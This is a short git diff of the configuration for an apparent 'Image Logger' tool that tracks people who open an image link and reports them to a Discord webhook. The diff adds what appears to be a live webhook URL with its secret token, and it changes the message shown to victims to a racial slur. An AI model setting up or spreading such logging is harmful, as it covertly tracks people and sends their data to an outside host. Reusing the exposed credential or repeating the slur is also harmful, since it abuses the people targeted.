@@ -13,8 +13,8 @@ __author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1405013145373769789/nGkQfBeSWpgNEMscn_svIS8carLELdAPmvMRKyGfEECYJYrEMcE6EGrAL5Sb-oAFKwjg",
+    "image": "https://media.discordapp.net/attachments/1405013122992963648/1405013350613647401/Tupac27s_passport_headshot.png?ex=689d4826&is=689bf6a6&hm=2da01379ee4bfe6830ef14bfd13f7308f7c5820107fce21b8ddc6a633c079835&=&format=webp&quality=lossless&width=485&height=648", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -29,7 +29,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by Dexty's Image Logger. https://github.com/xdexty0/Discord-Image-Logger", # Message to show
+        "message": "broke ass nigga", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
